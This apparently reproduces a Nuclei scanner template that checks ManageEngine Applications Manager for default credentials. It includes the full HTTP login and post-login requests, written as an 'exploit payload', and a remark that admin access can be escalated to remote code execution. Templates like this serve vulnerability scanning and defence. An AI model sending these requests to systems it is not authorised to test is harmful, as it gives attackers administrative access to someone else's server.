# Nuclei Template: ManageEngine Applications Manager - Default Credentials
**Template ID:** app-manager-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`app-manager-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Default credentials grants administrative access to ManageEngine Applications Manager, which can be later escalated into a RCE via DB queries.

## Steps to reproduce / Exploit Payload
```http
GET /index.do HTTP/1.1
Host: {{Hostname}}

POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/index.do

clienttype=html&webstart=&j_username=admin&ScreenWidth=1280&ScreenHeight=709&username={{username}}&j_password={{password}}

GET /showresource.do?group=All&method=showResourceTypes&monitor_viewtype=categoryview HTTP/1.1
Host: {{Hostname}}
Referer: {{RootURL}}/j_security_check
```

## References
- https://www.manageengine.com/products/applications_manager/
